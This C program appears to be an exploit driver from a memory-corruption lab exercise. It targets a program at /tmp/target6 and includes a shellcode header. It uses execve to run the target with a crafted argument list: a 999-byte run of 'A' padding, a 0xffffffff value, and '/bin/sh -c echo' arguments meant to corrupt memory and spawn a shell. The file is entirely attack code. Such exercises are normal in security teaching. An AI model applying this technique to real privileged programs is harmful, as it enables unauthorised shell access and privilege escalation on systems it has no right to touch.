#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{
	//char arg1[] = "$5$afkj23234ASF$T.C3isXspLrawvd2smItz4/.r15VkfIW/xxIlgtVixB";
	char arg1[1024];
	char arg2[8]; //1023
	char arg3[3] = "-c";
	char arg4[8] = "/bin/sh";
	char arg5[5] = "echo";
	char arg6[999];
	char arg7[20];

	
	strcpy(arg2, "/bin/sh");
	strcpy(arg1, "prova\n");
	memset(arg6, 'A', sizeof(arg6));
	*(unsigned*)(&arg7[0]) = 0xffffffff;

	char *args[] = { TARGET, arg1, arg2, arg3, arg4, arg5, arg6,
	arg7, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}

